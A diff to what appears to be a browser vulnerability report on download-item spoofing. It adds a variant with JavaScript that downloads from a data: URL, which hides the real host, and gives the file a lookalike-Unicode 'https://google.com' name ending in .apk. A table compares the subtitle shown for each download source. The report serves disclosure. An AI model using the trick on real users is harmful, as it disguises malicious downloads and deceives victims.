@@ -35,6 +35,24 @@ const name = "https\u2236\u2215\u2215google.com" + "\u2800".repeat(40) + ".apk";
 Variant A only fits without padding: the title is 265px wide and holds about 45 characters.
 Adding `U+2800` padding pushes the tail past the ellipsis.
 
+Variant C — the subtitle normally shows the real host (`1 bytes — killukeren.github.io — 22:44`).
+Downloading from a `data:` URL makes it show `(data)` instead, so the only origin-looking
+text left is the page-controlled title:
+
+```js
+const a = document.createElement("a");
+a.href = "data:application/octet-stream;base64,eA==";
+a.download = "ini aplikasi apa From https\u2236\u2215\u2215google.com.apk";
+a.click();
+```
+
+| Source | Subtitle |
+|---|---|
+| `https://…` | `1 bytes — killukeren.github.io — 22:44` |
+| `blob:https://…` | `1 bytes — killukeren.github.io — 22:44` |
+| `data:` | `1 bytes — (data) — 22:44` |
+| `blob:null/…` (from a `data:` page) | `1 bytes — (data) — 22:44` |
+
 Firefox 160 is not affected by this variant: its download item uses `crop="center"`, so the
 extension stays visible.
 
